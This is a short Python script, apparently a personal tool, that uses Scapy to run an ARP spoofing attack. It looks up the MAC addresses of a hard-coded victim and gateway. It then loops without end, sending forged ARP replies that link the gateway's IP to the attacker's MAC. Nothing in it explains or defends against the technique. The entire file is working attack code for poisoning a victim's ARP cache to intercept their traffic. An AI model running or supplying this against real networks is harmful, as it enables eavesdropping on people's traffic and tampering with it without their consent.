from scapy.all import *

mymac="2c:f0:5d:e5:d1:d4"
victimip="192.168.0.106"
gatewayip="192.168.0.254"

arpbr= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gatewayip)
arpv= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=victimip)

rcvbr = srp(arpbr,timeout=2)
rcvv = srp(arpv,timeout=2)

macbr = rcvbr[0][0][1].hwsrc
macv = rcvv[0][0][1].hwsrc

attack = ARP(psrc=gatewayip, pdst=victimip, hwdst=macv, hwsrc=mymac)

try:
    while True:
        send(attack)
        time.sleep(1)
except KeyboardInterrupt:
    quit()